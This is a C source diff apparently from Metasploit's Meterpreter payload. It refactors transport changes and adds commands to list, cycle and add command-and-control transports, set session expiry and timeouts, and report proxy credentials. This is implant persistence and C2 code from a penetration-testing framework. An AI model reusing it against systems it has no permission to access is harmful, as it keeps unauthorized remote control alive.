@@ -87,21 +87,25 @@ remote_request_core_migrate(Remote *remote, Packet *packet)
 	return FALSE;
 }
 
-BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* pResult) {
+DWORD create_transport_from_request(Remote* remote, Packet* packet, Transport** transportBufer)
+{
 	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
-	Packet* response = packet_create_response(packet);
-	UINT transportType = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_TYPE);
+	Transport* transport = NULL;
 	char* transportUrl = packet_get_tlv_value_string(packet, TLV_TYPE_TRANS_URL);
 
-	TimeoutSettings timeouts;
-	timeouts.expiry = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
+	TimeoutSettings timeouts = { 0 };
+
+	int sessionExpiry = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
 	timeouts.comms = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
 	timeouts.retry_total = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
 	timeouts.retry_wait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);
 
-	if (timeouts.expiry == 0) {
-		timeouts.expiry = remote->transport->timeouts.expiry;
+	// special case, will still leave this in here even if it's not transport related
+	if (sessionExpiry != 0) {
+		remote->sess_expiry_time = sessionExpiry;
+		remote->sess_expiry_end = current_unix_timestamp() + remote->sess_expiry_time;
 	}
+
 	if (timeouts.comms == 0) {
 		timeouts.comms = remote->transport->timeouts.comms;
 	}
@@ -112,36 +116,163 @@ BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD*
 		timeouts.retry_wait = remote->transport->timeouts.retry_wait;
 	}
 
-	dprintf("[CHANGE TRANS] Type: %u", transportType);
-	dprintf("[CHANGE TRANS] Url: %S", transportUrl);
-	dprintf("[CHANGE TRANS] Expiration: %d", timeouts.expiry);
+	dprintf("[CHANGE TRANS] Url: %s", transportUrl);
 	dprintf("[CHANGE TRANS] Comms: %d", timeouts.comms);
 	dprintf("[CHANGE TRANS] Retry Total: %u", timeouts.retry_total);
 	dprintf("[CHANGE TRANS] Retry Wait: %u", timeouts.retry_wait);
 
 	do {
-		if (response == NULL || transportUrl == NULL) {
+		if (transportUrl == NULL) {
 			dprintf("[CHANGE TRANS] Something was NULL");
 			break;
 		}
 
-		if (transportType == METERPRETER_TRANSPORT_SSL) {
-			remote->next_transport = remote->trans_create_tcp(transportUrl, &timeouts);
-		}
-		else {
-			// We still don't do this! But one day.. *shakes fist*
-			break;
+		if (strncmp(transportUrl, "tcp", 3) == 0) {
+			MetsrvTransportTcp config = { 0 };
+			config.common.comms_timeout = timeouts.comms;
+			config.common.retry_total = timeouts.retry_total;
+			config.common.retry_wait = timeouts.retry_wait;
+			memcpy(config.common.url, transportUrl, sizeof(config.common.url));
+			transport = remote->trans_create(remote, &config.common, NULL);
 		}
 
 		// tell the server dispatch to exit, it should pick up the new transport
 		result = ERROR_SUCCESS;
 	} while (0);
 
-	if (packet) {
-		packet_transmit_empty_response(remote, response, result);
+	*transportBufer = transport;
+
+	return result;
+}
+
+DWORD remote_request_core_transport_list(Remote* remote, Packet* packet) {
+	DWORD result = ERROR_SUCCESS;
+	Packet* response = NULL;
+
+	do {
+		response = packet_create_response(packet);
+
+		if (!response) {
+			result = ERROR_NOT_ENOUGH_MEMORY;
+			break;
+		}
+
+		// Add the session timeout to the top level
+		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());
+
+		Transport* current = remote->transport;
+		Transport* first = remote->transport;
+
+		do {
+			Packet* transportGroup = packet_create_group();
+
+			if (!transportGroup) {
+				// bomb out, returning what we have so far.
+				break;
+			}
+
+			dprintf("[DISPATCH] Adding URL %S", current->url);
+			packet_add_tlv_string(transportGroup, TLV_TYPE_TRANS_URL, current->url);
+			dprintf("[DISPATCH] Adding Comms timeout %u", current->timeouts.comms);
+			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_COMM_TIMEOUT, current->timeouts.comms);
+			dprintf("[DISPATCH] Adding Retry total %u", current->timeouts.retry_total);
+			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_TOTAL, current->timeouts.retry_total);
+			dprintf("[DISPATCH] Adding Retry wait %u", current->timeouts.retry_wait);
+			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_WAIT, current->timeouts.retry_wait);
+
+			if (current->type != METERPRETER_TRANSPORT_SSL) {
+				HttpTransportContext* ctx = (HttpTransportContext*)current->ctx;
+				dprintf("[DISPATCH] Transport is HTTP/S");
+				if (ctx->ua) {
+					packet_add_tlv_string(transportGroup, TLV_TYPE_TRANS_UA, ctx->ua);
+				}
+				if (ctx->proxy) {
+					packet_add_tlv_string(transportGroup, TLV_TYPE_TRANS_PROXY_HOST, ctx->proxy);
+				}
+				if (ctx->proxy_user) {
+					packet_add_tlv_string(transportGroup, TLV_TYPE_TRANS_PROXY_USER, ctx->proxy_user);
+				}
+				if (ctx->proxy_pass) {
+					packet_add_tlv_string(transportGroup, TLV_TYPE_TRANS_PROXY_PASS, ctx->proxy_pass);
+				}
+				if (ctx->cert_hash) {
+					packet_add_tlv_raw(transportGroup, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
+				}
+			}
+
+			packet_add_group(response, TLV_TYPE_TRANS_GROUP, transportGroup);
+
+			current = current->next_transport;
+		} while (first != current);
+	} while (0);
+
+	if (response) {
+		packet_transmit_response(result, remote, response);
 	}
 
-	return result == ERROR_SUCCESS ? FALSE : TRUE;
+	return result;
+}
+
+BOOL remote_request_core_transport_next(Remote* remote, Packet* packet, DWORD* result)
+{
+	dprintf("[DISPATCH] Asking to go to next transport (from 0x%p to 0x%p)", remote->transport, remote->transport->next_transport);
+	if (remote->transport == remote->transport->next_transport) {
+		dprintf("[DISPATCH] Transports are the same, don't do anything");
+		// if we're switching to the same thing, don't bother.
+		*result = ERROR_INVALID_PARAMETER;
+	}
+	else {
+		dprintf("[DISPATCH] Transports are different, perform the switch");
+		remote->next_transport = remote->transport->next_transport;
+		*result = ERROR_SUCCESS;
+	}
+
+	packet_transmit_empty_response(remote, packet, *result);
+	return *result == ERROR_SUCCESS ? FALSE : TRUE;
+
+}
+
+BOOL remote_request_core_transport_prev(Remote* remote, Packet* packet, DWORD* result)
+{
+	dprintf("[DISPATCH] Asking to go to previous transport (from 0x%p to 0x%p)", remote->transport, remote->transport->prev_transport);
+	if (remote->transport == remote->transport->prev_transport) {
+		dprintf("[DISPATCH] Transports are the same, don't do anything");
+		// if we're switching to the same thing, don't bother.
+		*result = ERROR_INVALID_PARAMETER;
+	}
+	else {
+		dprintf("[DISPATCH] Transports are different, perform the switch");
+		remote->next_transport = remote->transport->prev_transport;
+		*result = ERROR_SUCCESS;
+	}
+
+	packet_transmit_empty_response(remote, packet, *result);
+	return *result == ERROR_SUCCESS ? FALSE : TRUE;
+}
+
+DWORD remote_request_core_transport_add(Remote* remote, Packet* packet)
+{
+	Transport* transport = NULL;
+	DWORD result = create_transport_from_request(remote, packet, &transport);
+
+	packet_transmit_empty_response(remote, packet, result);
+	return result;
+}
+
+BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* pResult)
+{
+	Transport* transport = NULL;
+	DWORD result = create_transport_from_request(remote, packet, &transport);
+
+	packet_transmit_empty_response(remote, packet, result);
+
+	if (result == ERROR_SUCCESS) {
+		remote->next_transport = transport;
+		// exit out of the dispatch loop.
+		return FALSE;
+	}
+
+	return TRUE;
 }
 
 /*!
@@ -157,11 +288,72 @@ DWORD remote_request_transport_set_timeouts(Remote * remote, Packet * packet)
 	DWORD result = ERROR_SUCCESS;
 	Packet* response = NULL;
 
-	do
-	{
+	do {
 		response = packet_create_response(packet);
-		if (!response)
-		{
+		if (!response) {
+			result = ERROR_NOT_ENOUGH_MEMORY;
+			break;
+		}
+
+		int expirationTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
+		int commsTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
+		DWORD retryTotal = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
+		DWORD retryWait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);
+
+		// if it's in the past, that's fine, but 0 implies not set
+		if (expirationTimeout != 0) {
+			dprintf("[DISPATCH TIMEOUT] setting expiration time to %d", expirationTimeout);
+			remote->sess_expiry_time = expirationTimeout;
+			remote->sess_expiry_end = current_unix_timestamp() + expirationTimeout;
+		}
+
+		if (commsTimeout != 0) {
+			dprintf("[DISPATCH TIMEOUT] setting comms timeout to %d", commsTimeout);
+			remote->transport->timeouts.comms = commsTimeout;
+			remote->transport->comms_last_packet = current_unix_timestamp();
+		}
+
+		if (retryTotal > 0) {
+			dprintf("[DISPATCH TIMEOUT] setting retry total to %u", retryTotal);
+			remote->transport->timeouts.retry_total = retryTotal;
+		}
+
+		if (retryWait > 0) {
+			dprintf("[DISPATCH TIMEOUT] setting retry wait to %u", retryWait);
+			remote->transport->timeouts.retry_wait = retryWait;
+		}
+
+		// for the session expiry, return how many seconds are left before the session actually expires
+		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());
+		packet_add_tlv_uint(response, TLV_TYPE_TRANS_COMM_TIMEOUT, remote->transport->timeouts.comms);
+		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_TOTAL, remote->transport->timeouts.retry_total);
+		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_WAIT, remote->transport->timeouts.retry_wait);
+
+	} while (0);
+
+	if (response) {
+		packet_transmit_response(result, remote, response);
+	}
+
+	return result;
+}
+
+/*!
+ * @brief Update the timeouts with the given values
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the request packet.
+ * @returns Indication of success or failure.
+ * @remark If no values are given, no updates are made. The response to
+ *         this message is the new/current settings.
+ */
+DWORD remote_request_core_transport_set_timeouts(Remote * remote, Packet * packet)
+{
+	DWORD result = ERROR_SUCCESS;
+	Packet* response = NULL;
+
+	do {
+		response = packet_create_response(packet);
+		if (!response) {
 			result = ERROR_NOT_ENOUGH_MEMORY;
 			break;
 		}
@@ -174,44 +366,40 @@ DWORD remote_request_transport_set_timeouts(Remote * remote, Packet * packet)
 		// TODO: put this in a helper function that can be used everywhere?
 
 		// if it's in the past, that's fine, but 0 implies not set
-		if (expirationTimeout != 0)
-		{
+		if (expirationTimeout != 0) {
 			dprintf("[DISPATCH TIMEOUT] setting expiration time to %d", expirationTimeout);
-			remote->transport->timeouts.expiry = expirationTimeout;
-			remote->transport->expiration_end = expirationTimeout + current_unix_timestamp();
+			remote->sess_expiry_time = expirationTimeout;
+			remote->sess_expiry_end = current_unix_timestamp() + expirationTimeout;
 		}
 
-		if (commsTimeout != 0)
-		{
+		if (commsTimeout != 0) {
 			dprintf("[DISPATCH TIMEOUT] setting comms timeout to %d", commsTimeout);
 			remote->transport->timeouts.comms = commsTimeout;
 			remote->transport->comms_last_packet = current_unix_timestamp();
 		}
 
-		if (retryTotal > 0)
-		{
+		if (retryTotal > 0) {
 			dprintf("[DISPATCH TIMEOUT] setting retry total to %u", retryTotal);
 			remote->transport->timeouts.retry_total = retryTotal;
 		}
 
-		if (retryWait > 0)
-		{
+		if (retryWait > 0) {
 			dprintf("[DISPATCH TIMEOUT] setting retry wait to %u", retryWait);
 			remote->transport->timeouts.retry_wait = retryWait;
 		}
 
 		// for the session expiry, return how many seconds are left before the session actually expires
-		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->transport->expiration_end - current_unix_timestamp());
+		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());
 		packet_add_tlv_uint(response, TLV_TYPE_TRANS_COMM_TIMEOUT, remote->transport->timeouts.comms);
 		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_TOTAL, remote->transport->timeouts.retry_total);
 		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_WAIT, remote->transport->timeouts.retry_wait);
 
 	} while (0);
 
-	if (response)
-	{
+	if (response) {
 		packet_transmit_response(result, remote, response);
 	}
 
 	return result;
 }
+
